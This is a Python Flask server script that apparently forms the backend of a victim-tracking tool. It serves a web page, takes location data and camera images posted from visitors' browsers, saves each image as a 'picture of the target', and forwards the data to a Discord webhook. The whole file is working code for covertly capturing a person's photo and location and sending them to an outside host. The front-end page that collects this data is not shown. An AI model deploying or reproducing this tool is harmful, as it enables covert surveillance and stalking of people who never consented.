#!/usr/bin/env python3
import os
from flask import Flask, request, Response
from utils import get_file_data, update_webhook
import time
import requests

# Using environment variables with defaults if not set
TARGET_URL = os.getenv('TARGET_URL', 'http://localhost:8000/image')
PORT = int(os.getenv('PORT', '8000'))
DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL', '')

if not os.path.exists('image'):
    print(f"Creating image directory at {os.getcwd()}/image")
    os.mkdir('image')
PATH_TO_IMAGES_DIR = os.path.join(os.getcwd(), 'image')

HTML_FILE_NAME = "index.html"
app = Flask(__name__)

@app.route("/", methods=["GET"])
def get_website():
    try:
        html_data = get_file_data(HTML_FILE_NAME)
        return Response(html_data, content_type="text/html")
    except FileNotFoundError:
        return "HTML file not found", 404

@app.route("/location_update", methods=["POST"])
def update_location():
    data = request.json
    update_webhook(DISCORD_WEBHOOK_URL, data)
    return "OK"

@app.route('/image', methods=['POST'])
def image():
    img_file = request.files['image']
    filename = ('%s.jpeg' % time.strftime("%Y%m%d-%H%M%S"))
    img_file.save(os.path.join(PATH_TO_IMAGES_DIR, filename))
    print(f"Picture of the target captured and saved as {filename}")

    # Send the image to the Discord webhook
    if DISCORD_WEBHOOK_URL:
        files = {'image': open(os.path.join(PATH_TO_IMAGES_DIR, filename), 'rb')}
        requests.post(DISCORD_WEBHOOK_URL, files=files)
    return Response(f"{filename} saved and potentially sent to Discord webhook")

def main():
    print(f"Server running on port {PORT}")
    app.run(debug=False, host="0.0.0.0", port=PORT)

if __name__ == "__main__":
    main()